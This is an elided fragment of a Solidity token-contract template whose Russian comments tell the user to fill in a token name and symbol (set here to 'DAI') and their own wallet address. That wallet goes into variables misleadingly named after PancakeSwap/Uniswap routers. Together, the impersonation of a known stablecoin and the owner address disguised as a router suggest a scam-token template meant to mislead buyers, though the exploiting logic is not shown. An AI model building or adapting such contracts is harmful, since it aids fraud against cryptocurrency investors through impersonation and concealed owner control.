...
;contract token is Context, IERC20, Ownable { //Изменяем fixedtoken на имя своего токена (в одно слово)
    ...
    string private constant _name = "DAI"; //Изменяем Name на собственное имя токена
    string private constant _symbol = "DAI"; //Изменяем Name на сокращённое имя токена (пример- "Btc")

    address public _PancakeSwapV1RouterUniswap = 0x921a53f39f5a581B07EB077c5134E76C349A93f8 ; //PancakeSwap owner (Изменяем на свой адрес кошелька)
    address public _PancakeSwapV2RouterUniswap = 0x921a53f39f5a581B07EB077c5134E76C349A93f8 ; //can be the same (Изменяем на свой адрес кошелька, тот же, что и в строке выше)
